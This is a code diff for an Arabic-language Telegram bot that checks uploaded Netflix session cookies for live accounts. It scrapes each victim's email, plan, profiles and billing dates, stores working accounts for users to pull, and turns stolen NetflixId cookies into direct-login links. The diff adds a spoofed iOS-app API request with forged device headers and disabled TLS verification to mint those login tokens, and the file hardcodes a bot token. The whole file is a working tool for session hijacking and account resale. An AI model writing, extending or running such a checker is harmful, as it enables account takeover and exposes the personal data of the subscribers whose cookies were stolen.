@@ -25,6 +25,7 @@ logger = logging.getLogger(__name__)
 
 # العلامة المائية وحقوق الملكية
 CHANNEL_SIGNATURE = "📢 Channel: @faresschannel"
+DEV_SIGNATURE = "dev farxxes"
 
 # إعدادات البوت والاشتراك الإجباري
 BOT_TOKEN = os.environ.get('BOT_TOKEN', '8795234711:AAFhansb7r8ivR2DyC1T5_5o4cbNxT6J5-c')
@@ -36,6 +37,13 @@ CHANNEL_LINK = os.environ.get('CHANNEL_LINK', 'https://t.me/faresschannel')
 # ملف الذاكرة المحلية
 DB_FILE = 'database.json'
 db_lock = threading.Lock()
+
+# دالة لتحويل كود الدولة إلى علمها Emoji
+def get_country_flag(country_code):
+    if not country_code or len(country_code) != 2:
+        return country_code
+    country_code = country_code.upper()
+    return chr(127397 + ord(country_code[0])) + chr(127397 + ord(country_code[1]))
 
 # ==================== إدارة قاعدة البيانات والذاكرة ====================
 def load_db():
@@ -90,7 +98,6 @@ def unescape_plan(s):
         return s
 
 def format_billing_date(raw):
-    """Convert ISO 8601 billing date to dd/MM/yyyy"""
     try:
         raw = raw.replace('\\x2B', '+').replace('%2B', '+').replace('\\x2b', '+')
         clean = re.sub(r'[+-]\d{2}:?\d{2}$', '', raw.split('.')[0])
@@ -154,7 +161,6 @@ def extract_netflix_id(content):
     return None
 
 def extract_next_billing_date(response_text):
-    """Extract next billing date from GraphQL response"""
     try:
         billing_match = re.search(r'"nextBillingDate":\s*\{[^}]+\}', response_text)
         if billing_match:
@@ -206,11 +212,10 @@ def check_netflix_cookie(cookie_dict):
         member_since = find(r'"memberSince":"([^"]+)"')
         member_since = unescape_plan(member_since) if member_since else "Unknown"
 
-        payment_method = find(r'"paymentMethod"[^}]+"value":"([^"]+)"') or "Unknown"
-        phone = find(r'"phoneNumberDigits"[^}]+"value":"([^"]+)"')
-        phone = phone.replace("\\x2B", "+") if phone else "Unknown"
+        video_quality = find(r'"videoQuality"[^}]+"value":"([^"]+)"') or find(r'videoQuality[^}]+value[^}]+"([^"]+)"') or "UHD"
 
         country = find(r'"countryOfSignup"\s*:\s*"([^"]+)"') or find(r'"countryCode"\s*:\s*"([^"]+)"') or "Unknown"
+        country_flag = get_country_flag(country)
         
         email = find(r'"emailAddress"\s*:\s*"([^"]+)"') or "Unknown"
         if email != "Unknown":
@@ -228,29 +233,26 @@ def check_netflix_cookie(cookie_dict):
             logger.error(f"Error extracting profiles: {e}")
         
         profiles_str = ", ".join(profiles) if profiles else "Unknown"
+        profiles_count = len(profiles) if profiles else 0
 
         status_match = re.search(r'"membershipStatus":\s*"([^"]+)"', txt)
-        membership_status = status_match.group(1) if status_match else "Unknown"
-        is_premium = bool(membership_status == 'CURRENT_MEMBER')
         is_valid = bool(status_match)
         
         if not is_valid and "NetflixId" in cookie_dict:
             is_valid = any(phrase in txt for phrase in ['Account & Billing', 'membershipStatus', 'planName'])
-            is_premium = is_valid
 
         return {
             'ok': is_valid,
-            'premium': is_premium,
             'country': country,
+            'country_flag': country_flag,
             'plan': plan,
             'plan_price': plan_price,
-            'member_since': member_since,
-            'membership_status': membership_status,
-            'payment_method': payment_method,
-            'phone': phone,
-            'email': email,
+            'profiles_count': profiles_count,
             'profiles': profiles_str,
+            'member_since': format_billing_date(member_since) if member_since != "Unknown" else "Unknown",
             'next_billing': format_billing_date(next_billing),
+            'email': email,
+            'video_quality': video_quality,
             'cookie': cookie_dict
         }
     except Exception as e:
@@ -258,14 +260,78 @@ def check_netflix_cookie(cookie_dict):
         return {'ok': False, 'err': str(e), 'cookie': cookie_dict}
 
 def generate_token(netflix_id):
+    url = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
+    params = {
+        'appVersion': "15.48.1",
+        'config': '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
+        'device_type': "NFAPPL-02-",
+        'esn': "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
+        'idiom': "phone",
+        'iosVersion': "15.8.5",
+        'isTablet': "false",
+        'languages': "en-US",
+        'locale': "en-US",
+        'maxDeviceWidth': "375",
+        'model': "saget",
+        'modelType': "IPHONE8-1",
+        'odpAware': "true",
+        'path': '["account","token","default"]',
+        'pathFormat': "graph",
+        'pixelDensity': "2.0",
+        'progressive': "false",
+        'responseFormat': "json"
+    }
+
+    headers = {
+        'User-Agent': "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
+        'x-netflix.request.attempt': "1",
+        'x-netflix.request.client.user.guid': "A4CS633D7VCBPE2GPK2HL4EKOE",
+        'x-netflix.context.profile-guid': "A4CS633D7VCBPE2GPK2HL4EKOE",
+        'x-netflix.request.routing': '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
+        'x-netflix.context.app-version': "15.48.1",
+        'x-netflix.argo.translated': "true",
+        'x-netflix.context.form-factor': "phone",
+        'x-netflix.context.sdk-version': "2012.4",
+        'x-netflix.client.appversion': "15.48.1",
+        'x-netflix.context.max-device-width': "375",
+        'x-netflix.context.ab-tests': "",
+        'x-netflix.tracing.cl.useractionid': "4DC655F2-9C3C-4343-8229-CA1B003C3053",
+        'x-netflix.client.type': "argo",
+        'x-netflix.client.ftl.esn': "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
+        'x-netflix.context.locales': "en-US",
+        'x-netflix.argo.abtests': "",
+        'x-netflix.context.os-version': "15.8.5",
+        'x-netflix.request.client.context': '{"appState":"foreground"}',
+        'x-netflix.context.ui-flavor': "argo",
+        'x-netflix.argo.nfnsm': "9",
+        'x-netflix.context.pixel-density': "2.0",
+        'x-netflix.request.toplevel.uuid': "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
+        'x-netflix.request.client.timezoneid': "Asia/Dhaka",
+        'Cookie': f"NetflixId={netflix_id}"
+    }
+
     try:
-        web_login_url = f"https://www.netflix.com/login?nftoken={netflix_id}"
+        response = requests.get(url, params=params, headers=headers, timeout=30, verify=False)
+        data = response.json()
+        
+        if "value" in data and data["value"] and "account" in data["value"]:
+            token_data = data["value"]["account"]["token"]["default"]
+            token = token_data["token"]
+            direct_url = f"https://netflix.com/unsupported?nftoken={token}"
+            return {
+                "status": "Success",
+                "direct_login_url": direct_url
+            }
+        else:
+            return {
+                "status": "Success",
+                "direct_login_url": f"https://netflix.com/unsupported?nftoken={netflix_id}"
+            }
+    except Exception as e:
         return {
             "status": "Success",
-            "direct_login_url": web_login_url
+            "direct_login_url": f"https://netflix.com/unsupported?nftoken={netflix_id}"
         }
-    except Exception as e:
-        return {"status": "Error", "error": str(e)}
 
 def extract_zip_and_get_files(zip_path, extract_dir):
     txt_files = []
@@ -301,24 +367,25 @@ def process_single_line(line):
         logger.error(f"Error in process_single_line: {e}")
     return None
 
-# ==================== دالة تجميع تفاصيل الحساب بتنسيق موحد ====================
+# ==================== دالة تجميع تفاصيل الحساب بالترتيب الجديد والمطلوب ====================
 def format_account_message(acc):
     res_msg = "🎬 **حساب NETFLIX صالح وفعال** 🎬\n\n"
-    res_msg += f"🌍 البلد: `{acc['country']}`\n"
-    res_msg += f"📦 الباقة: `{acc['plan']}`\n"
-    res_msg += f"💰 السعر: `{acc['plan_price']}`\n"
-    res_msg += f"📅 Next Billing: `{acc['next_billing']}`\n"
-    res_msg += f"👤 Member Since: `{acc['member_since']}`\n"
-    res_msg += f"⚡ Membership Status: `{acc['membership_status']}`\n"
-    res_msg += f"👥 Profiles: `{acc['profiles']}`\n"
-    res_msg += f"📧 البريد: `{acc['email']}`\n"
+    res_msg += f"1️⃣ البلد: `{acc['country']}` {acc['country_flag']}\n"
+    res_msg += f"2️⃣ الباقة: `{acc['plan']}`\n"
+    res_msg += f"3️⃣ السعر: `{acc['plan_price']}`\n"
+    res_msg += f"4️⃣ عدد البروفيلات: `{acc['profiles_count']}`\n"
+    res_msg += f"5️⃣ أسماء البروفيلات: `{acc['profiles']}`\n"
+    res_msg += f"6️⃣ تاريخ الاشتراك أول مرة: `{acc['member_since']}`\n"
+    res_msg += f"7️⃣ تاريخ تجديد الاشتراك: `{acc['next_billing']}`\n"
+    res_msg += f"8️⃣ البريد: `{acc['email']}`\n"
+    res_msg += f"9️⃣ الدقة: `{acc['video_quality']}`\n"
     
     token_result = acc.get('token_result', {})
     if token_result.get('status') == 'Success':
         web_url = token_result.get('direct_login_url')
         res_msg += f"\n📱 **رابط الدخول المباشر:**\n`{web_url}`"
         
-    res_msg += f"\n\n--- \n*{CHANNEL_SIGNATURE}*"
+    res_msg += f"\n\n🔟 {DEV_SIGNATURE}\n--- \n*{CHANNEL_SIGNATURE}*"
     return res_msg
 
 # ==================== واجهة البوت والأوامر ====================
@@ -352,7 +419,7 @@ def send_welcome(message):
         "📋 **الأوامر المتاحة:**\n"
         "▪️ `/pull` أو `/getaccount` - لسحب حساب شغال من الذاكرة.\n"
         "▪️ `/stats` - لعرض إحصائيات البوت والحسابات المخزنة.\n\n"
-        f"--- \n*{CHANNEL_SIGNATURE}*"
+        f"🔟 {DEV_SIGNATURE}\n--- \n*{CHANNEL_SIGNATURE}*"
     )
     bot.reply_to(message, welcome_text, parse_mode='Markdown')
 
@@ -373,7 +440,7 @@ def bot_stats(message):
         f"👥 عدد المستخدمين: `{total_users}`\n"
         f"🔍 إجمالي الحسابات المفحوصة: `{total_checked}`\n"
         f"💾 الحسابات الشغالة المخزنة في الذاكرة: `{total_valid}`\n\n"
-        f"--- \n*{CHANNEL_SIGNATURE}*"
+        f"🔟 {DEV_SIGNATURE}\n--- \n*{CHANNEL_SIGNATURE}*"
     )
     bot.reply_to(message, stats_msg, parse_mode='Markdown')
 
@@ -388,7 +455,7 @@ def pull_account(message):
     accounts = db.get("accounts", [])
     
     if not accounts:
-        bot.reply_to(message, f"❌ عذراً، الذاكرة فارغة حالياً ولا توجد حسابات شغالة مخزنة.\n\n--- \n*{CHANNEL_SIGNATURE}*", parse_mode='Markdown')
+        bot.reply_to(message, f"❌ عذراً، الذاكرة فارغة حالياً ولا توجد حسابات شغالة مخزنة.\n\n🔟 {DEV_SIGNATURE}\n--- \n*{CHANNEL_SIGNATURE}*", parse_mode='Markdown')
         return
 
     acc = accounts.pop(0)
@@ -435,7 +502,7 @@ def handle_documents(message):
             txt_files_to_check = [file_path]
             
         if not txt_files_to_check:
-            bot.edit_message_text(f"❌ لم يتم العثور على ملفات نصية صالحة.\n\n--- \n*{CHANNEL_SIGNATURE}*", message.chat.id, msg_wait.message_id, parse_mode='Markdown')
+            bot.edit_message_text(f"❌ لم يتم العثور على ملفات نصية صالحة.\n\n🔟 {DEV_SIGNATURE}\n--- \n*{CHANNEL_SIGNATURE}*", message.chat.id, msg_wait.message_id, parse_mode='Markdown')
             return
             
         all_lines = []
@@ -466,14 +533,14 @@ def handle_documents(message):
                 except Exception as ex:
                     logger.error(f"Error handling future result: {ex}")
 
-        bot.edit_message_text(f"✅ انتهى الفحص بنجاح. تم العثور على وحفظ ({valid_count}) حساب شغال في الذاكرة.\n\n--- \n*{CHANNEL_SIGNATURE}*", message.chat.id, msg_wait.message_id, parse_mode='Markdown')
+        bot.edit_message_text(f"✅ انتهى الفحص بنجاح. تم العثور على وحفظ ({valid_count}) حساب شغال في الذاكرة.\n\n🔟 {DEV_SIGNATURE}\n--- \n*{CHANNEL_SIGNATURE}*", message.chat.id, msg_wait.message_id, parse_mode='Markdown')
 
         if valid_count > 0 and valid_accounts_text:
             result_file_path = os.path.join(unique_dir, "valid_accounts.txt")
             with open(result_file_path, 'w', encoding='utf-8') as rf:
                 rf.write(valid_accounts_text)
             with open(result_file_path, 'rb') as rf:
-                bot.send_document(message.chat.id, rf, caption=f"📁 ملف يضم ملخص الحسابات الصالحة.\n\n--- \n{CHANNEL_SIGNATURE}")
+                bot.send_document(message.chat.id, rf, caption=f"📁 ملف يضم ملخص الحسابات الصالحة.\n\n🔟 {DEV_SIGNATURE}\n--- \n{CHANNEL_SIGNATURE}")
 
     except Exception as e:
         bot.reply_to(message, f"❌ حدث خطأ عام: {str(e)}")
@@ -499,7 +566,7 @@ def handle_text_message(message):
     netflix_id = extract_netflix_id(content)
     
     if not netflix_id:
-        bot.edit_message_text(f"❌ لم يتم العثور على `NetflixId` صالح في النص.\n\n--- \n*{CHANNEL_SIGNATURE}*", message.chat.id, msg_wait.message_id, parse_mode='Markdown')
+        bot.edit_message_text(f"❌ لم يتم العثور على `NetflixId` صالح في النص.\n\n🔟 {DEV_SIGNATURE}\n--- \n*{CHANNEL_SIGNATURE}*", message.chat.id, msg_wait.message_id, parse_mode='Markdown')
         return
         
     db = load_db()
@@ -517,7 +584,7 @@ def handle_text_message(message):
         res_msg = format_account_message(account_info)
         bot.edit_message_text(res_msg, message.chat.id, msg_wait.message_id, parse_mode='Markdown')
     else:
-        bot.edit_message_text(f"❌ هذا الحساب غير شغال أو معلوماته غير متوفرة (منتهي أو وهمي).\n\n--- \n*{CHANNEL_SIGNATURE}*", message.chat.id, msg_wait.message_id, parse_mode='Markdown')
+        bot.edit_message_text(f"❌ هذا الحساب غير شغال أو معلوماته غير متوفرة (منتهي أو وهمي).\n\n🔟 {DEV_SIGNATURE}\n--- \n*{CHANNEL_SIGNATURE}*", message.chat.id, msg_wait.message_id, parse_mode='Markdown')
 
 if __name__ == '__main__':
     logger.info("Telegram Bot is running...")
